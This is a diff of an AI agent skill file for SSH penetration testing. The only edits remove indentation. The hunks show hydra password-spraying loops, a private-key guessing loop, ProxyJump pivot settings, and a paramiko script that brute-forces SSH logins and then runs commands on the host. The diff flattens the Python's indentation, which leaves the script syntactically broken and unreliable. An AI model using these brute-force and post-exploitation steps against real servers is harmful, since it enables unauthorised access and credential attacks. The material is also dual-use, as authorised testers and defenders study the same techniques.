@@ -2,8 +2,8 @@
 name: SSH Penetration Testing
 description: This skill should be used when the user asks to "pentest SSH services", "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH vulnerabilities", "perform SSH tunneling", or "audit SSH security". It provides comprehensive SSH penetration testing methodologies and techniques.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # SSH Penetration Testing
@@ -153,7 +153,7 @@ hydra -L users.txt -p Summer2024! ssh://192.168.1.100
 
 # Multiple common passwords
 for pass in "Password123" "Welcome1" "Summer2024!"; do
-    hydra -L users.txt -p "$pass" ssh://192.168.1.100
+ hydra -L users.txt -p "$pass" ssh://192.168.1.100
 done
 ```
 
@@ -173,7 +173,7 @@ ssh -o PreferredAuthentications=password user@192.168.1.100
 
 # Try common key names
 for key in id_rsa id_dsa id_ecdsa id_ed25519; do
-    ssh -i "$key" user@192.168.1.100
+ ssh -i "$key" user@192.168.1.100
 done
 ```
 
@@ -287,9 +287,9 @@ ssh -J user1@jump1,user2@jump2 user3@target
 # With SSH config
 # ~/.ssh/config
 Host target
-    HostName 192.168.2.50
-    User admin
-    ProxyJump user@192.168.1.100
+ HostName 192.168.2.50
+ User admin
+ ProxyJump user@192.168.1.100
 ```
 
 ### Phase 8: Post-Exploitation
@@ -335,54 +335,54 @@ import paramiko
 import sys
 
 def ssh_connect(host, username, password):
-    """Attempt SSH connection with credentials"""
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
-    try:
-        client.connect(host, username=username, password=password, timeout=5)
-        print(f"[+] Success: {username}:{password}")
-        return client
-    except paramiko.AuthenticationException:
-        print(f"[-] Failed: {username}:{password}")
-        return None
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        return None
+ """Attempt SSH connection with credentials"""
+ client = paramiko.SSHClient()
+ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ 
+ try:
+ client.connect(host, username=username, password=password, timeout=5)
+ print(f"[+] Success: {username}:{password}")
+ return client
+ except paramiko.AuthenticationException:
+ print(f"[-] Failed: {username}:{password}")
+ return None
+ except Exception as e:
+ print(f"[!] Error: {e}")
+ return None
 
 def execute_command(client, command):
-    """Execute command via SSH"""
-    stdin, stdout, stderr = client.exec_command(command)
-    output = stdout.read().decode()
-    errors = stderr.read().decode()
-    return output, errors
+ """Execute command via SSH"""
+ stdin, stdout, stderr = client.exec_command(command)
+ output = stdout.read().decode()
+ errors = stderr.read().decode()
+ return output, errors
 
 def ssh_brute_force(host, username, wordlist):
-    """Brute-force SSH with wordlist"""
-    with open(wordlist, 'r') as f:
-        passwords = f.read().splitlines()
-    
-    for password in passwords:
-        client = ssh_connect(host, username, password.strip())
-        if client:
-            # Run post-exploitation commands
-            output, _ = execute_command(client, 'id; uname -a')
-            print(output)
-            client.close()
-            return True
-    return False
+ """Brute-force SSH with wordlist"""
+ with open(wordlist, 'r') as f:
+ passwords = f.read().splitlines()
+ 
+ for password in passwords:
+ client = ssh_connect(host, username, password.strip())
+ if client:
+ # Run post-exploitation commands
+ output, _ = execute_command(client, 'id; uname -a')
+ print(output)
+ client.close()
+ return True
+ return False
 
 # Usage
 if __name__ == "__main__":
-    target = "192.168.1.100"
-    user = "admin"
-    
-    # Single credential test
-    client = ssh_connect(target, user, "password123")
-    if client:
-        output, _ = execute_command(client, "ls -la")
-        print(output)
-        client.close()
+ target = "192.168.1.100"
+ user = "admin"
+ 
+ # Single credential test
+ client = ssh_connect(target, user, "password123")
+ if client:
+ output, _ = execute_command(client, "ls -la")
+ print(output)
+ client.close()
 ```
 
 ### Phase 10: Metasploit SSH Modules
